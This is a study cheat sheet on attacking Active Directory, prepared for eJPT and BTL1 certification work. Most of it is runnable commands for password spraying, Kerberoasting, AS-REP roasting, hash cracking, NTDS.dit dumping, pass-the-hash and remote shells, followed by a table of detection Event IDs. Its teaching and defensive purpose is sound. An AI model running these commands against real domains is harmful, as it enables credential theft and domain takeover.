# Active Directory Enumeration & Attacks Cheat Sheet

Active Directory (AD) is the backbone of enterprise networks — it shows up constantly in eJPT's host/network pentest module and on the log-analysis/DFIR side of BTL1. This document covers **enumerating** AD and the most common AD attack techniques.

---

## Table of Contents

1. [Core Concepts](#1-core-concepts)
2. [Initial Enumeration (Unauthenticated / Null Session)](#2-initial-enumeration-unauthenticated--null-session)
3. [Authenticated Enumeration](#3-authenticated-enumeration)
4. [BloodHound / SharpHound](#4-bloodhound--sharphound)
5. [Kerberoasting](#5-kerberoasting)
6. [AS-REP Roasting](#6-as-rep-roasting)
7. [Other Common Attacks](#7-other-common-attacks)
8. [Lateral Movement & Credential Use](#8-lateral-movement--credential-use)
9. [Defensive / Detection Perspective (BTL1)](#9-defensive--detection-perspective-btl1)
10. [Quick Command Reference](#10-quick-command-reference)

---

## 1. Core Concepts

Quick definitions of the AD building blocks referenced throughout the rest of this document.

| Term | Description |
|---|---|
| **Domain Controller (DC)** | The server hosting the AD database (NTDS.dit) and handling authentication requests |
| **Kerberos** | AD's default authentication protocol — ticket-based (TGT/TGS) |
| **LDAP** | The protocol used to query domain objects (users, groups, computers) |
| **SPN** (Service Principal Name) | A service's unique identifier registered to Kerberos — the target of Kerberoasting |
| **GPO** (Group Policy Object) | Domain-wide setting/policy distribution — can sometimes contain a password (GPP) |
| **Trust** | A trust relationship between two domains/forests — can be a pivot point for lateral movement |

---

## 2. Initial Enumeration (Unauthenticated / Null Session)

Test how much information can be gathered without credentials / with minimal privilege:

```bash
# Discover the domain and the DC
nmap -p 88,389,445,464,636,3268 -sV target-ip

# Try a null session for SMB enumeration
enum4linux -a target-ip
crackmapexec smb target-ip -u '' -p '' --shares

# Try an anonymous LDAP bind
ldapsearch -x -H ldap://target-ip -b "dc=domain,dc=local"
```

> **Why it matters:** Misconfigured DCs may still allow anonymous LDAP binds or null SMB sessions — you can pull a user list, group memberships, and even the password policy without any credentials at all.

---

## 3. Authenticated Enumeration

Once you have at least one domain user's credentials (via phishing, password spraying, LLMNR poisoning, etc.), enumeration goes much deeper.

```bash
# Domain info via CrackMapExec
crackmapexec smb target-ip -u user -p 'Password1' --users
crackmapexec smb target-ip -u user -p 'Password1' --groups
crackmapexec smb target-ip -u user -p 'Password1' --loggedon-users

# Manual enumeration with rpcclient
rpcclient -U "user%Password1" target-ip
> enumdomusers
> enumdomgroups
> querydominfo

# User/group list via LDAP (ldapdomaindump)
ldapdomaindump -u 'DOMAIN\user' -p 'Password1' target-ip
```

### Password Spraying

```bash
# Try one password against the whole user list — avoids account lockout
crackmapexec smb target-ip -u users.txt -p 'Summer2026!' --continue-on-success
```

> ⚠️ **Warning:** Always check the **lockout policy** first (`net accounts` or `crackmapexec --pass-pol`) before password spraying — otherwise you risk locking out every domain account.

---

## 4. BloodHound / SharpHound

BloodHound visualizes AD relationships (who's a member of which group, who's a local admin on which machine, what trust relationships exist) and uses pre-built queries like **"Shortest Path to Domain Admin"** to automatically surface the attack path.

```bash
# Data collection (from a domain-joined machine, or remotely with credentials)
SharpHound.exe -c All
# or from Linux (BloodHound.py)
bloodhound-python -u user -p 'Password1' -d domain.local -c All -ns target-ip
```

Import the collected `.zip`/JSON files into the BloodHound GUI, then use built-in queries:

- `Find all Domain Admins`
- `Shortest Paths to Domain Admins from Owned Principals`
- `Find Kerberoastable Users`
- `Find computers where Domain Users can RDP`

> **Practical workflow:** After compromising a user account, mark it as "Owned" in BloodHound → then instantly see the shortest path from that account to Domain Admin.

---

## 5. Kerberoasting

The technique of requesting a Kerberos TGS ticket for an SPN-bearing service account and attempting to crack it offline. Service accounts tend to have weak/old passwords because they're rarely rotated.

```bash
# Request tickets for SPN-bearing accounts with Impacket, output in hash format
GetUserSPNs.py domain.local/user:'Password1' -dc-ip target-ip -request

# With Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 hashes.txt rockyou.txt
```

> **Why it works:** The TGS ticket is encrypted with a key derived from the target service's password. You can request the ticket without any elevated privilege (any authenticated user can) — cracking it offline is just a matter of time.

---

## 6. AS-REP Roasting

For user accounts with **Kerberos pre-authentication disabled**, the AS-REP message can be captured in a directly crackable format — no credentials required, just a valid username.

```bash
# Find pre-auth-disabled users and grab their hashes
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip target-ip

# Crack with hashcat (mode 18200 = AS-REP)
hashcat -m 18200 asrep-hashes.txt rockyou.txt
```

---

## 7. Other Common Attacks

A grab-bag of additional techniques that don't fit the earlier sections but come up just as often in practice.

| Attack | Summary |
|---|---|
| **GPP Password (MS14-025)** | Older GPOs can leave weakly-encrypted (cpassword) local admin passwords in `Groups.xml` — scanned for with `Get-GPPPassword` |
| **LLMNR/NBT-NS Poisoning** | Using `Responder` to poison broadcast name-resolution requests on the network and capture NTLM hashes |
| **Pass-the-Hash** | Authenticating with just the NTLM hash, no plaintext password needed (`crackmapexec smb target -u user -H ntlmhash`) |
| **Pass-the-Ticket** | Stealing and directly reusing a Kerberos ticket (TGT/TGS) (Mimikatz `sekurlsa::tickets`) |
| **DCSync** | With Domain Admin/Replication privileges, impersonating the DC to pull every domain hash (including `krbtgt`) (`secretsdump.py`) |
| **Unconstrained/Constrained Delegation abuse** | Abusing misconfigured delegation to impersonate other users/services |

```bash
# Remote dump of NTDS.dit with secretsdump (requires high privilege)
secretsdump.py domain.local/admin:'Password1'@target-ip
```

---

## 8. Lateral Movement & Credential Use

The commands used to move from one compromised host to another once you have valid credentials or hashes in hand.

```bash
# Bulk credential/hash testing with CrackMapExec
crackmapexec smb targets.txt -u user -H ntlmhash

# Remote command execution with PsExec / wmiexec
psexec.py domain.local/admin:'Password1'@target-ip
wmiexec.py domain.local/admin:'Password1'@target-ip

# Shell over WinRM with Evil-WinRM
evil-winrm -i target-ip -u admin -p 'Password1'
```

---

## 9. Defensive / Detection Perspective (BTL1)

Every one of these red-team techniques maps to a log/Event ID on the blue-team side:

| Attack | Detection point |
|---|---|
| Kerberoasting | Event ID **4769** (Kerberos service ticket request) — a burst of requests for many different SPNs in a short window |
| Password Spraying | Event ID **4625** (failed logon) — many different users failing to log in from a single IP in a short window |
| Pass-the-Hash | Event ID **4624** logon type 3 (network logon), NTLM authentication, from an unusual source machine |
| DCSync | Event ID **4662** (directory service access) — a `Replicating Directory Changes` request from a non-DC machine |

> This table also ties directly into the **Windows Event ID Reference** cheat sheet — use these attacks as reference points when reading that document.

---

## 10. Quick Command Reference

A single-page lookup for every command covered above.

| Need | Command |
|---|---|
| Null session SMB enum | `enum4linux -a target-ip` |
| Authenticated user/group list | `crackmapexec smb target-ip -u user -p pass --users` |
| BloodHound data collection (Linux) | `bloodhound-python -u user -p pass -d domain.local -c All -ns dc-ip` |
| Kerberoasting | `GetUserSPNs.py domain.local/user:pass -request` |
| AS-REP Roasting | `GetNPUsers.py domain.local/ -usersfile users.txt -no-pass` |
| Crack hash (Kerberoast) | `hashcat -m 13100 hashes.txt rockyou.txt` |
| Crack hash (AS-REP) | `hashcat -m 18200 hashes.txt rockyou.txt` |
| NTDS.dit dump | `secretsdump.py domain.local/admin:pass@dc-ip` |
| Pass-the-hash | `crackmapexec smb target-ip -u user -H ntlmhash` |
| WinRM shell | `evil-winrm -i target-ip -u user -p pass` |

---

*Prepared as a reference for the eJPT host/network pentest module and BTL1 log analysis. All techniques should only be used within written authorization (scope/RoE).*
